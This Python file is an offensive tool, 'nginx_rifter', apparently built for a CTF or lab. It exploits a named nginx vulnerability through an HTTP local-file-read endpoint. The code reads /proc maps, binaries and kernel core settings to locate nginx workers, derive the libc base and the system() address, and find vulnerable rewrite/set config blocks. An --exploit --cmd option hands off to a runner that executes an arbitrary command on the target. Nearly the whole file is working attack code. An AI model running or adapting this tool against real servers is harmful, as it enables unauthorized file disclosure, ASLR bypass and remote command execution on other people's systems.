#!/usr/bin/env python3
import argparse
import datetime as dt
import fnmatch
import hashlib
import json
import os
import re
import shlex
import socket
import subprocess
import sys
import urllib.error
import urllib.parse
import urllib.request
from dataclasses import dataclass, field
from pathlib import PurePosixPath

import ctf_remote_exploit as ctf
import poc
from demo_ctf_exploit_v1_9 import (
    BUG_CVE,
    BUG_DETAIL,
    BUG_NAME,
    FIXED_UPSTREAM,
    HttpFileReadTarget,
    dpkg_package_version,
    elf_build_id,
    extract_version_strings,
    lfi_hash_file,
    lfi_read_prefix,
    parse_host_port,
    parse_key_value_text,
)


TOOL_VERSION = "v2.0"
DEFAULT_TARGET = "192.168.1.205:19321"
DEFAULT_CONFIG_PATHS = (
    "/etc/nginx/nginx.conf",
    "/usr/local/nginx/conf/nginx.conf",
    "/app/nginx-lfi.conf",
    "/app/nginx.conf",
)


class Palette:
    def __init__(self, enabled=True):
        self.enabled = enabled and "NO_COLOR" not in os.environ

    def paint(self, text, code):
        if not self.enabled:
            return str(text)
        return f"\033[{code}m{text}\033[0m"

    def bold(self, text):
        return self.paint(text, "1")

    def cyan(self, text):
        return self.paint(text, "36")

    def green(self, text):
        return self.paint(text, "32")

    def yellow(self, text):
        return self.paint(text, "33")

    def red(self, text):
        return self.paint(text, "31")

    def dim(self, text):
        return self.paint(text, "2")


class Reporter:
    def __init__(self, color=True, verbose=False):
        self.c = Palette(color)
        self.verbose = verbose
        self.step_no = 0

    def line(self, text=""):
        print(text, flush=True)

    def banner(self, target, vector):
        self.line()
        self.line(self.c.bold(self.c.cyan(f"nginx_rifter {TOOL_VERSION} - NGINX Rift assessor")))
        self.line(self.c.dim("=" * 78))
        self.line(f"Bug:      {self.c.bold(BUG_CVE)} - {BUG_NAME}")
        self.line(f"Cause:    {BUG_DETAIL}")
        self.line(f"Target:   {self.c.bold(target)}")
        self.line(f"FileRead: {vector}")
        self.line("Default:  assessment only; pass --exploit --cmd ... for the crashing exploit path")
        self.line(f"Fixed:    {FIXED_UPSTREAM}")
        self.line(self.c.dim("=" * 78))
        self.line()

    def step(self, title):
        self.step_no += 1
        self.line()
        self.line(self.c.bold(self.c.cyan(f"[{self.step_no:02d}] {title}")))
        self.line(self.c.dim("-" * 78))

    def kv(self, key, value, status=None):
        rendered = str(value)
        if status == "ok":
            rendered = self.c.green(rendered)
        elif status == "warn":
            rendered = self.c.yellow(rendered)
        elif status == "bad":
            rendered = self.c.red(rendered)
        self.line(f"    {self.c.dim((key + ':').ljust(30))} {rendered}")

    def ok(self, text):
        self.line(f"{self.c.green('[+]')} {text}")

    def warn(self, text):
        self.line(f"{self.c.yellow('[!]')} {text}")

    def fail(self, text):
        self.line(f"{self.c.red('[-]')} {text}")

    def info(self, text):
        if self.verbose:
            self.line(f"{self.c.cyan('[*]')} {text}")


@dataclass
class ReadAttempt:
    path: str
    ok: bool
    bytes_read: int = 0
    sample: str = ""
    error: str = ""


@dataclass
class ConfigCandidate:
    source: str
    line: int
    location: str
    rewrite: str
    set_directive: str
    reason: str
    confidence: str


@dataclass
class Assessment:
    target: dict
    started_at: str
    http: dict = field(default_factory=dict)
    file_read: dict = field(default_factory=dict)
    os: dict = field(default_factory=dict)
    proc: dict = field(default_factory=dict)
    worker: dict = field(default_factory=dict)
    binaries: dict = field(default_factory=dict)
    nginx_config: dict = field(default_factory=dict)
    viability: dict = field(default_factory=dict)
    exploit: dict = field(default_factory=dict)
    completed_at: str = ""


class RifterTarget(HttpFileReadTarget):
    def __init__(self, *args, headers=None, **kwargs):
        super().__init__(*args, **kwargs)
        self.headers = headers or {}

    def get(self, path_or_url, timeout=None):
        if path_or_url.startswith(("http://", "https://")):
            url = path_or_url
        else:
            url = self.base_url + path_or_url
        request = urllib.request.Request(url, headers=self.headers)
        with urllib.request.urlopen(request, timeout=timeout or self.timeout) as resp:
            return resp.read()

    def open_response(self, path="/", timeout=None):
        request = urllib.request.Request(self.base_url + path, headers=self.headers)
        return urllib.request.urlopen(request, timeout=timeout or self.timeout)


def now():
    return dt.datetime.now(dt.UTC).isoformat(timespec="seconds")


def parse_headers(values):
    headers = {}
    for value in values or []:
        if ":" not in value:
            raise argparse.ArgumentTypeError("headers must be in 'Name: value' form")
        name, header_value = value.split(":", 1)
        headers[name.strip()] = header_value.strip()
    return headers


def parse_target(value, fallback_port):
    host, embedded_port = parse_host_port(value)
    return host, embedded_port or fallback_port


def status_for_bool(value):
    if value is True:
        return "ok"
    if value is False:
        return "bad"
    return "warn"


def short_error(exc):
    if isinstance(exc, urllib.error.HTTPError):
        return f"HTTP {exc.code}"
    return str(exc)


def try_read(target, path, timeout=3, offset=None, length=None):
    try:
        data = target.lfi_read(path, timeout=timeout, offset=offset, length=length)
        sample = data[:120].decode("latin-1", errors="replace").replace("\n", "\\n")
        return ReadAttempt(path=path, ok=True, bytes_read=len(data), sample=sample)
    except Exception as exc:
        return ReadAttempt(path=path, ok=False, error=short_error(exc))


def h2_cleartext_probe(host, port, timeout=3):
    try:
        with socket.create_connection((host, port), timeout=timeout) as sock:
            sock.sendall(poc.H2_PREFACE)
            sock.settimeout(timeout)
            data = sock.recv(64)
        return {"tested": True, "ok": len(data) >= 9, "bytes": len(data)}
    except Exception as exc:
        return {"tested": True, "ok": False, "bytes": 0, "error": str(exc)}


def http_fingerprint(target, args):
    result = {"url": target.base_url, "headers": {}, "ok": False}
    try:
        with target.open_response("/", timeout=args.timeout) as response:
            body = response.read(512)
            result.update(
                {
                    "ok": True,
                    "status": response.status,
                    "reason": response.reason,
                    "headers": dict(response.headers.items()),
                    "body_sample": body.decode("latin-1", errors="replace"),
                }
            )
    except Exception as exc:
        result["error"] = short_error(exc)
    if args.scheme == "http":
        result["http2_cleartext"] = h2_cleartext_probe(target.host, target.port, args.timeout)
    else:
        result["http2_cleartext"] = {"tested": False, "reason": "cleartext h2 probe skipped for https"}
    return result


def profile_file_read(target, args):
    reads = {
        "os_release": try_read(target, "/etc/os-release", args.timeout),
        "proc_self_status": try_read(target, "/proc/self/status", args.timeout),
        "proc_self_maps": try_read(target, "/proc/self/maps", args.timeout),
        "aslr": try_read(target, "/proc/sys/kernel/randomize_va_space", args.timeout),
        "core_pattern": try_read(target, "/proc/sys/kernel/core_pattern", args.timeout),
        "suid_dumpable": try_read(target, "/proc/sys/fs/suid_dumpable", args.timeout),
        "kernel": try_read(target, "/proc/version", args.timeout),
    }
    binary_probe = try_read(target, "/bin/sh", args.timeout, offset=0, length=4)
    range_probe = {"ok": None, "reason": "not tested"}
    if reads["os_release"].ok:
        try:
            full = target.lfi_read("/etc/os-release", timeout=args.timeout)
            first = try_read(target, "/etc/os-release", args.timeout, offset=0, length=8)
            second = try_read(target, "/etc/os-release", args.timeout, offset=8, length=8)
            if first.ok and second.ok:
                expected = full[:8] + full[8:16]
                observed = target.lfi_read("/etc/os-release", timeout=args.timeout, offset=0, length=8)
                observed += target.lfi_read("/etc/os-release", timeout=args.timeout, offset=8, length=8)
                range_probe = {
                    "ok": observed == expected and first.bytes_read == 8 and second.bytes_read == 8,
                    "first_bytes": first.bytes_read,
                    "second_bytes": second.bytes_read,
                }
            else:
                range_probe = {"ok": False, "reason": first.error or second.error}
        except Exception as exc:
            range_probe = {"ok": False, "reason": short_error(exc)}

    return {
        "reads": {name: attempt.__dict__ for name, attempt in reads.items()},
        "small_text_read": reads["os_release"].ok or reads["proc_self_status"].ok,
        "proc_self_status": reads["proc_self_status"].ok,
        "proc_self_maps": reads["proc_self_maps"].ok,
        "binary_read": binary_probe.ok and binary_probe.bytes_read >= 4,
        "binary_probe": binary_probe.__dict__,
        "range_read": range_probe,
    }


def read_text_or_empty(target, path, timeout=3):
    try:
        return target.lfi_text(path, timeout=timeout)
    except Exception:
        return ""


def discover_worker(target, args):
    worker = {"ok": False, "pid_files": args.pid_file}
    try:
        facts, php_uid, master_pid = ctf.find_worker(target, args.max_pid, args.pid_file)
        system_offset = None
        system_addr = None
        system_error = ""
        try:
            system_offset, system_addr = ctf.derive_system(target, facts.libc_path, facts.libc_base)
        except Exception as exc:
            system_error = short_error(exc)
        worker.update(
            {
                "ok": True,
                "php_uid": php_uid,
                "master_pid": master_pid,
                "worker_pid": facts.worker_pid,
                "worker_uid": facts.worker_uid,
                "nginx_rw_base": f"{facts.nginx_rw_base:#x}",
                "nginx_path": facts.nginx_path,
                "libc_base": f"{facts.libc_base:#x}",
                "libc_path": facts.libc_path,
                "heap_ranges": [[f"{start:#x}", f"{end:#x}"] for start, end in facts.heap_ranges],
                "system_offset": f"{system_offset:#x}" if system_offset is not None else "",
                "system_addr": f"{system_addr:#x}" if system_addr is not None else "",
                "system_error": system_error,
            }
        )
    except Exception as exc:
        worker["error"] = short_error(exc)
        try:
            master_pid, children = ctf.children_from_pidfile(target, args.pid_file)
            worker["master_pid"] = master_pid
            worker["worker_children"] = children
        except Exception:
            pass
    return worker


def binary_fingerprints(target, worker, args):
    result = {}
    if not worker.get("ok"):
        return result
    for label, path in (("nginx", worker.get("nginx_path")), ("libc", worker.get("libc_path"))):
        if not path:
            continue
        item = {"path": path}
        try:
            digest = lfi_hash_file(target, path, args.fingerprint_max_bytes)
            item.update({"sha256": digest["sha256"], "bytes_read": digest["bytes_read"]})
        except Exception as exc:
            item["hash_error"] = short_error(exc)
        try:
            item["build_id"] = elf_build_id(target, path)
        except Exception as exc:
            item["build_id_error"] = short_error(exc)
        try:
            blob = lfi_read_prefix(target, path, args.version_scan_bytes)
            item["versions"] = extract_version_strings(blob)
        except Exception as exc:
            item["version_error"] = short_error(exc)
        result[label] = item
    status_text = read_text_or_empty(target, "/var/lib/dpkg/status", timeout=args.timeout)
    if status_text:
        result.setdefault("libc", {})["dpkg_version"] = dpkg_package_version(status_text, "libc6")
    return result


def parse_cmdline(raw):
    parts = [part for part in raw.replace("\x00", "\n").splitlines() if part]
    if len(parts) == 1 and " " in parts[0]:
        try:
            return shlex.split(parts[0])
        except ValueError:
            return parts[0].split()
    return parts


def resolve_nginx_conf_from_cmdline(args_list):
    prefix = ""
    conf = ""
    i = 0
    while i < len(args_list):
        arg = args_list[i]
        if arg == "-p" and i + 1 < len(args_list):
            prefix = args_list[i + 1]
            i += 2
            continue
        if arg.startswith("-p") and len(arg) > 2:
            prefix = arg[2:]
        if arg == "-c" and i + 1 < len(args_list):
            conf = args_list[i + 1]
            i += 2
            continue
        if arg.startswith("-c") and len(arg) > 2:
            conf = arg[2:]
        i += 1
    if conf and not conf.startswith("/") and prefix:
        return str(PurePosixPath(prefix) / conf)
    return conf


def strip_nginx_comment(line):
    escaped = False
    quote = ""
    out = []
    for char in line:
        if escaped:
            out.append(char)
            escaped = False
            continue
        if char == "\\":
            out.append(char)
            escaped = True
            continue
        if quote:
            out.append(char)
            if char == quote:
                quote = ""
            continue
        if char in ("'", '"'):
            quote = char
            out.append(char)
            continue
        if char == "#":
            break
        out.append(char)
    return "".join(out)


def collect_location_blocks(text, source):
    blocks = []
    current = None
    depth = 0
    for lineno, original in enumerate(text.splitlines(), start=1):
        line = strip_nginx_comment(original).strip()
        if not line:
            continue
        if current is None:
            match = re.search(r"\blocation\s+(.+?)\s*\{", line)
            if match:
                current = {
                    "source": source,
                    "line": lineno,
                    "location": match.group(1).strip(),
                    "lines": [line],
                    "start_depth": depth,
                }
        else:
            current["lines"].append(line)
        depth += line.count("{") - line.count("}")
        if current is not None and depth <= current["start_depth"]:
            blocks.append(current)
            current = None
    return blocks


def analyze_vulnerable_blocks(configs):
    candidates = []
    for source, text in configs.items():
        for block in collect_location_blocks(text, source):
            body = "\n".join(block["lines"])
            rewrites = re.findall(r"\brewrite\s+([^;]+);", body)
            sets = re.findall(r"\bset\s+([^;]+);", body)
            for rewrite in rewrites:
                try:
                    parts = shlex.split(rewrite, comments=False, posix=True) if rewrite else []
                except ValueError:
                    parts = []
                replacement = parts[1] if len(parts) >= 2 else rewrite
                if "?" not in replacement:
                    continue
                for set_directive in sets:
                    if re.search(r"\$\d+", set_directive):
                        candidates.append(
                            ConfigCandidate(
                                source=source,
                                line=block["line"],
                                location=block["location"],
                                rewrite=rewrite,
                                set_directive=set_directive,
                                reason="rewrite replacement contains '?' and set directive consumes regex capture",
                                confidence="high",
                            )
                        )
    return candidates


def include_paths_from_config(text, base_dir):
    paths = []
    for match in re.finditer(r"^\s*include\s+([^;]+);", text, flags=re.M):
        raw = match.group(1).strip().strip('"').strip("'")
        if "*" in raw or "?" in raw or "[" in raw:
            paths.append({"path": raw, "glob": True, "resolved": []})
            continue
        path = raw if raw.startswith("/") else str(PurePosixPath(base_dir) / raw)
        paths.append({"path": raw, "glob": False, "resolved": [path]})
    return paths


def discover_nginx_config(target, worker, args):
    result = {
        "configs": {},
        "attempted_paths": [],
        "unresolved_includes": [],
        "vulnerable_candidates": [],
    }
    candidate_paths = list(dict.fromkeys(args.config_path + list(DEFAULT_CONFIG_PATHS)))
    master_pid = worker.get("master_pid")
    if master_pid:
        raw = read_text_or_empty(target, f"/proc/{master_pid}/cmdline", timeout=args.timeout)
        cmdline = parse_cmdline(raw)
        result["master_cmdline"] = cmdline
        conf_from_cmdline = resolve_nginx_conf_from_cmdline(cmdline)
        if conf_from_cmdline:
            candidate_paths.insert(0, conf_from_cmdline)

    configs = {}
    queue = list(dict.fromkeys(candidate_paths))
    seen = set()
    while queue and len(seen) < args.max_config_files:
        path = queue.pop(0)
        if path in seen:
            continue
        seen.add(path)
        result["attempted_paths"].append(path)
        text = read_text_or_empty(target, path, timeout=args.timeout)
        if not text or "{" not in text:
            continue
        configs[path] = text
        base_dir = str(PurePosixPath(path).parent)
        for include in include_paths_from_config(text, base_dir):
            if include["glob"]:
                result["unresolved_includes"].append(include["path"])
            else:
                for resolved in include["resolved"]:
                    if resolved not in seen:
                        queue.append(resolved)

    result["configs"] = {
        path: {
            "bytes": len(text.encode("utf-8", errors="replace")),
            "sha256": hashlib.sha256(text.encode("utf-8", errors="replace")).hexdigest(),
        }
        for path, text in configs.items()
    }
    result["vulnerable_candidates"] = [candidate.__dict__ for candidate in analyze_vulnerable_blocks(configs)]
    return result


def collect_os_info(target, file_profile, args):
    os_release_text = read_text_or_empty(target, "/etc/os-release", timeout=args.timeout)
    proc_version = read_text_or_empty(target, "/proc/version", timeout=args.timeout).strip()
    kernel_release = read_text_or_empty(target, "/proc/sys/kernel/osrelease", timeout=args.timeout).strip()
    os_release = parse_key_value_text(os_release_text)
    return {
        "pretty_name": os_release.get("PRETTY_NAME", ""),
        "id": os_release.get("ID", ""),
        "version_id": os_release.get("VERSION_ID", ""),
        "codename": os_release.get("VERSION_CODENAME") or os_release.get("UBUNTU_CODENAME", ""),
        "kernel_release": kernel_release,
        "kernel_build": proc_version,
        "aslr": (file_profile["reads"].get("aslr") or {}).get("sample", "").strip("\\n"),
        "core_pattern": (file_profile["reads"].get("core_pattern") or {}).get("sample", "").strip("\\n"),
        "suid_dumpable": (file_profile["reads"].get("suid_dumpable") or {}).get("sample", "").strip("\\n"),
    }


def evaluate_viability(http_info, file_profile, worker, config, binaries, os_info, args):
    checks = []

    def add(name, ok, detail):
        checks.append({"name": name, "ok": ok, "detail": detail})

    add("HTTP reachable", http_info.get("ok") is True, http_info.get("status") or http_info.get("error", ""))
    add("HTTP/2 cleartext victim", (http_info.get("http2_cleartext") or {}).get("ok") is True, http_info.get("http2_cleartext", {}))
    add("file-read primitive", file_profile.get("small_text_read") is True, "small text files readable")
    add("ranged file reads", (file_profile.get("range_read") or {}).get("ok") is True, file_profile.get("range_read", {}))
    add("binary file reads", file_profile.get("binary_read") is True, file_profile.get("binary_probe", {}))
    add("same-UID nginx worker maps", worker.get("ok") is True, worker.get("worker_pid") or worker.get("error", ""))
    add("libc/system derivation", bool(worker.get("system_addr")), worker.get("system_addr") or worker.get("system_error", ""))
    add("nginx config candidate", bool(config.get("vulnerable_candidates")), f"{len(config.get('vulnerable_candidates', []))} candidate(s)")
    add("nginx binary fingerprint", bool((binaries.get("nginx") or {}).get("build_id")), (binaries.get("nginx") or {}).get("build_id", ""))
    add("libc fingerprint", bool((binaries.get("libc") or {}).get("build_id")), (binaries.get("libc") or {}).get("build_id", ""))

    core_pattern = os_info.get("core_pattern", "")
    suid_dumpable = os_info.get("suid_dumpable", "")
    core_settings = core_pattern == "core" and suid_dumpable == "2"
    add("core settings compatible", core_settings, f"core_pattern={core_pattern!r}, suid_dumpable={suid_dumpable!r}")
    existing_core = try_read(args.target_obj, args.core_path, args.timeout, offset=0, length=4)
    add("pre-existing core readable", existing_core.ok and existing_core.sample.startswith("\x7fELF"), existing_core.error or f"{existing_core.bytes_read} bytes")

    required = {
        item["name"]: item["ok"]
        for item in checks
        if item["name"]
        in {
            "HTTP reachable",
            "HTTP/2 cleartext victim",
            "file-read primitive",
            "ranged file reads",
            "binary file reads",
            "same-UID nginx worker maps",
            "libc/system derivation",
            "core settings compatible",
        }
    }
    missing = [name for name, ok in required.items() if not ok]
    if missing:
        verdict = "partial"
        reason = "missing: " + ", ".join(missing)
    else:
        verdict = "ready-with-lab-like-core-leak"
        reason = "required primitives for the current core-guided chain are present"
    if not config.get("vulnerable_candidates"):
        reason += "; vulnerable rewrite/set route was not confirmed from readable config"

    return {"verdict": verdict, "reason": reason, "checks": checks}


def print_assessment(report, assessment):
    report.step("HTTP And Transport")
    http = assessment.http
    report.kv("base URL", http.get("url"))
    report.kv("HTTP", f"{http.get('status', 'n/a')} {http.get('reason', '')}", "ok" if http.get("ok") else "bad")
    report.kv("Server", (http.get("headers") or {}).get("Server", "not learned"))
    h2 = http.get("http2_cleartext") or {}
    report.kv("HTTP/2 cleartext", "yes" if h2.get("ok") else "no", "ok" if h2.get("ok") else "warn")

    report.step("File-Read Primitive")
    profile = assessment.file_read
    report.kv("small text read", profile.get("small_text_read"), status_for_bool(profile.get("small_text_read")))
    report.kv("binary read", profile.get("binary_read"), status_for_bool(profile.get("binary_read")))
    report.kv("ranged reads", (profile.get("range_read") or {}).get("ok"), status_for_bool((profile.get("range_read") or {}).get("ok")))
    report.kv("/proc/self/status", profile.get("proc_self_status"), status_for_bool(profile.get("proc_self_status")))
    report.kv("/proc/self/maps", profile.get("proc_self_maps"), status_for_bool(profile.get("proc_self_maps")))

    report.step("OS And Worker Discovery")
    os_info = assessment.os
    report.kv("OS", os_info.get("pretty_name") or "not learned")
    report.kv("kernel", os_info.get("kernel_release") or "not learned")
    report.kv("ASLR", os_info.get("aslr") or "not learned", "ok" if os_info.get("aslr") == "2" else "warn")
    report.kv("core_pattern", os_info.get("core_pattern") or "not learned", "ok" if os_info.get("core_pattern") == "core" else "warn")
    report.kv("suid_dumpable", os_info.get("suid_dumpable") or "not learned", "ok" if os_info.get("suid_dumpable") == "2" else "warn")
    worker = assessment.worker
    report.kv("worker maps", "readable" if worker.get("ok") else "not confirmed", "ok" if worker.get("ok") else "bad")
    if worker.get("ok"):
        report.kv("nginx worker PID", worker.get("worker_pid"))
        report.kv("nginx path", worker.get("nginx_path"))
        report.kv("nginx rw base", worker.get("nginx_rw_base"))
        report.kv("libc base", worker.get("libc_base"))
        report.kv("system()", worker.get("system_addr") or "not derived", "ok" if worker.get("system_addr") else "warn")
    else:
        report.kv("worker error", worker.get("error", "not learned"), "bad")

    report.step("Binary Fingerprints")
    for label in ("nginx", "libc"):
        item = assessment.binaries.get(label) or {}
        report.kv(f"{label} build-id", item.get("build_id") or "not learned", "ok" if item.get("build_id") else "warn")
        report.kv(f"{label} sha256", (item.get("sha256") or "not learned")[:32])
        if label == "libc":
            report.kv("libc dpkg", item.get("dpkg_version") or "not learned")

    report.step("Nginx Config Discovery")
    config = assessment.nginx_config
    report.kv("configs read", len(config.get("configs", {})), "ok" if config.get("configs") else "warn")
    for path, meta in list((config.get("configs") or {}).items())[:6]:
        report.kv(path, f"{meta['bytes']} bytes sha256={meta['sha256'][:16]}")
    candidates = config.get("vulnerable_candidates", [])
    report.kv("rewrite/set candidates", len(candidates), "ok" if candidates else "warn")
    for item in candidates[:6]:
        report.line(f"    {report.c.green('[candidate]')} {item['source']}:{item['line']} location {item['location']}")
        report.line(f"        rewrite: {item['rewrite']}")
        report.line(f"        set:     {item['set_directive']}")
    if config.get("unresolved_includes"):
        report.kv("unresolved includes", ", ".join(config["unresolved_includes"][:6]), "warn")

    report.step("Exploit-Chain Viability")
    viability = assessment.viability
    for check in viability.get("checks", []):
        status = "ok" if check["ok"] else "warn"
        report.kv(check["name"], check["detail"], status)
    verdict_status = "ok" if viability.get("verdict") == "ready-with-lab-like-core-leak" else "warn"
    report.kv("verdict", viability.get("verdict"), verdict_status)
    report.kv("reason", viability.get("reason"), verdict_status)


def write_artifact(assessment, path):
    assessment.completed_at = now()
    with open(path, "w", encoding="utf-8") as handle:
        json.dump(assessment.__dict__, handle, indent=2, sort_keys=True)
        handle.write("\n")


def run_exploit_handoff(args, report):
    if not args.cmd:
        raise RuntimeError("--exploit requires --cmd")
    cmd = [
        sys.executable,
        os.path.join(os.path.dirname(os.path.abspath(__file__)), "demo_ctf_exploit_v1_9.py"),
        "--host",
        f"{args.host}:{args.port}",
        "--cmd",
        args.cmd,
        "--artifact-dir",
        args.artifact_dir,
        "--target-profile",
        args.target_profile,
        "--scheme",
        args.scheme,
        "--lfi-endpoint",
        args.lfi_endpoint,
        "--file-param",
        args.file_param,
        "--offset-param",
        args.offset_param,
        "--length-param",
        args.length_param,
        "--phpinfo-path",
        args.phpinfo_path,
        "--rounds",
        str(args.exploit_rounds),
    ]
    if args.file_read_template:
        cmd.extend(["--file-read-template", args.file_read_template])
    if args.fast:
        cmd.append("--fast")
    if args.no_color:
        cmd.append("--no-color")
    report.step("Explicit Exploit Handoff")
    report.kv("runner", "demo_ctf_exploit_v1_9.py")
    report.kv("command", " ".join(shlex.quote(part) for part in cmd))
    return subprocess.call(cmd)


def assess(args):
    headers = parse_headers(args.header)
    if args.host_header:
        headers["Host"] = args.host_header
    target = RifterTarget(
        args.host,
        args.port,
        scheme=args.scheme,
        endpoint=args.lfi_endpoint,
        file_param=args.file_param,
        offset_param=args.offset_param,
        length_param=args.length_param,
        template=args.file_read_template,
        phpinfo_path=args.phpinfo_path,
        timeout=args.timeout,
        headers=headers,
    )
    args.target_obj = target
    report = Reporter(color=not args.no_color, verbose=args.verbose)
    report.banner(f"{args.host}:{args.port}", target.vector_label())
    assessment = Assessment(
        target={
            "host": args.host,
            "port": args.port,
            "scheme": args.scheme,
            "base_url": target.base_url,
            "target_profile": args.target_profile,
            "file_read": target.describe(),
        },
        started_at=now(),
    )
    assessment.http = http_fingerprint(target, args)
    assessment.file_read = profile_file_read(target, args)
    assessment.os = collect_os_info(target, assessment.file_read, args)
    assessment.worker = discover_worker(target, args)
    assessment.binaries = binary_fingerprints(target, assessment.worker, args)
    assessment.nginx_config = discover_nginx_config(target, assessment.worker, args)
    assessment.viability = evaluate_viability(
        assessment.http,
        assessment.file_read,
        assessment.worker,
        assessment.nginx_config,
        assessment.binaries,
        assessment.os,
        args,
    )
    print_assessment(report, assessment)
    os.makedirs(args.artifact_dir, exist_ok=True)
    artifact_path = args.output or os.path.join(
        args.artifact_dir,
        f"nginx_rifter_{dt.datetime.now().strftime('%Y%m%d-%H%M%S')}.json",
    )
    write_artifact(assessment, artifact_path)
    report.step("Assessment Artifact")
    report.kv("path", artifact_path, "ok")
    exit_code = 0
    if args.exploit:
        exit_code = run_exploit_handoff(args, report)
    return exit_code


def parse_args():
    parser = argparse.ArgumentParser(
        usage="%(prog)s --target HOST:PORT [--file-read-template TEMPLATE] [options]",
        description=(
            "Assessment-first NGINX Rift tool for authorized targets where an HTTP-accessible "
            "local-file-read primitive is available."
        ),
    )
    target = parser.add_argument_group("target")
    target.add_argument("--target", default=DEFAULT_TARGET, help="target as HOST:PORT")
    target.add_argument("--port", type=int, default=19321, help="fallback port when --target omits one")
    target.add_argument("--scheme", choices=("http", "https"), default="http")
    target.add_argument("--target-profile", choices=("generic", "lab"), default="generic")
    target.add_argument(
        "--file-read-template",
        help="custom file-read URL template, e.g. 'http://{host}:{port}/download?path={path_url}{range_query}'",
    )
    target.add_argument("--lfi-endpoint", default="/lfi.php", help="default query-param file-read endpoint")
    target.add_argument("--file-param", default="file", help="path query parameter for default endpoint")
    target.add_argument("--offset-param", default="offset", help="offset query parameter")
    target.add_argument("--length-param", default="length", help="length query parameter")
    target.add_argument("--phpinfo-path", default="/phpinfo.php", help="optional phpinfo path; empty disables")
    target.add_argument("--host-header", help="explicit Host header")
    target.add_argument("--header", action="append", help="extra HTTP header, 'Name: value'")

    assess_group = parser.add_argument_group("assessment")
    assess_group.add_argument("--pid-file", action="append", default=list(ctf.DEFAULT_PID_FILES), help="candidate nginx pid file")
    assess_group.add_argument("--max-pid", type=int, default=4096, help="PID scan ceiling")
    assess_group.add_argument("--config-path", action="append", default=[], help="additional nginx config path to try")
    assess_group.add_argument("--max-config-files", type=int, default=16, help="maximum config/include files to read")
    assess_group.add_argument("--core-path", default="/app/tmp/core", help="core path to test if already present")
    assess_group.add_argument("--fingerprint-max-bytes", type=int, default=32 * 1024 * 1024)
    assess_group.add_argument("--version-scan-bytes", type=int, default=8 * 1024 * 1024)
    assess_group.add_argument("--timeout", type=float, default=5)

    exploit = parser.add_argument_group("explicit exploit handoff")
    exploit.add_argument("--exploit", action="store_true", help="after assessment, run the tested v1.9 exploit path")
    exploit.add_argument("--cmd", help="command for --exploit")
    exploit.add_argument("--exploit-rounds", type=int, default=2)
    exploit.add_argument("--fast", action="store_true", help="pass --fast to exploit runner")

    output = parser.add_argument_group("output")
    output.add_argument("--artifact-dir", default="artifacts")
    output.add_argument("--output", help="assessment JSON path")
    output.add_argument("-v", "--verbose", action="store_true")
    output.add_argument("--no-color", action="store_true")
    args = parser.parse_args()
    host, port = parse_target(args.target, args.port)
    args.host = host
    args.port = port
    if args.file_read_template and not any(token in args.file_read_template for token in ("{path", "{file", "{range_query}")):
        parser.error("--file-read-template must include a path placeholder such as {path_url}")
    if args.exploit and not args.cmd:
        parser.error("--exploit requires --cmd")
    if args.max_config_files < 1:
        parser.error("--max-config-files must be positive")
    return args


def main():
    args = parse_args()
    try:
        return assess(args)
    except KeyboardInterrupt:
        print("\nInterrupted.", file=sys.stderr)
        return 130
    except Exception as exc:
        c = Palette("NO_COLOR" not in os.environ)
        print(f"\n{c.red('nginx_rifter failed:')} {exc}", file=sys.stderr)
        return 1


if __name__ == "__main__":
    sys.exit(main())
